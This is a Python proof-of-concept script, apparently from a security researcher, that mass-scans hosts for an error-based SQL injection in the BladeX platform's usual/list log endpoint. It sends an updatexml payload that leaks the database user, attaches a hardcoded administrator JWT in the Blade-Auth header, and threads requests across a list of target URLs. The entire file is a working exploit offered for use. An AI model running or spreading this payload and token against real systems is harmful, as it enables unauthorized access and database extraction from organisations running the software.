import requests
import argparse
import threading
import sys


def SMH(url,result):
    create_url = url+"/api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1"
    # 报错注入函数中的user()是对应响应包中的回显数据

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
             "Blade-Auth":"bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ",
               "Connection":"close"
               }

    try:
        req = requests.get(create_url,headers=headers,timeout=5)
        # print(req.text) 测试响应包中返回的数据
        if(req.status_code==500):
            if "~root@" in req.text:
                print(f"【+】{url}存在相关SQL注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关SQL注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")

def SMH_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=SMH,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在SQL注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''                                                                               
                                                         dddddddd                                       
BBBBBBBBBBBBBBBBB   lllllll                              d::::::d                  XXXXXXX       XXXXXXX
B::::::::::::::::B  l:::::l                              d::::::d                  X:::::X       X:::::X
B::::::BBBBBB:::::B l:::::l                              d::::::d                  X:::::X       X:::::X
BB:::::B     B:::::Bl:::::l                              d:::::d                   X::::::X     X::::::X
  B::::B     B:::::B l::::l   aaaaaaaaaaaaa      ddddddddd:::::d     eeeeeeeeeeee  XXX:::::X   X:::::XXX
  B::::B     B:::::B l::::l   a::::::::::::a   dd::::::::::::::d   ee::::::::::::ee   X:::::X X:::::X   
  B::::BBBBBB:::::B  l::::l   aaaaaaaaa:::::a d::::::::::::::::d  e::::::eeeee:::::ee  X:::::X:::::X    
  B:::::::::::::BB   l::::l            a::::ad:::::::ddddd:::::d e::::::e     e:::::e   X:::::::::X     
  B::::BBBBBB:::::B  l::::l     aaaaaaa:::::ad::::::d    d:::::d e:::::::eeeee::::::e   X:::::::::X     
  B::::B     B:::::B l::::l   aa::::::::::::ad:::::d     d:::::d e:::::::::::::::::e   X:::::X:::::X    
  B::::B     B:::::B l::::l  a::::aaaa::::::ad:::::d     d:::::d e::::::eeeeeeeeeee   X:::::X X:::::X   
  B::::B     B:::::B l::::l a::::a    a:::::ad:::::d     d:::::d e:::::::e         XXX:::::X   X:::::XXX
BB:::::BBBBBB::::::Bl::::::la::::a    a:::::ad::::::ddddd::::::dde::::::::e        X::::::X     X::::::X
B:::::::::::::::::B l::::::la:::::aaaa::::::a d:::::::::::::::::d e::::::::eeeeeeeeX:::::X       X:::::X
B::::::::::::::::B  l::::::l a::::::::::aa:::a d:::::::::ddd::::d  ee:::::::::::::eX:::::X       X:::::X
BBBBBBBBBBBBBBBBB   llllllll  aaaaaaaaaa  aaaa  ddddddddd   ddddd    eeeeeeeeeeeeeeXXXXXXX       XXXXXXX
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="BladeX企业级开发平台 usual/list SQL 注入漏洞")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        SMH(args.u, result)
        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        SMH_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()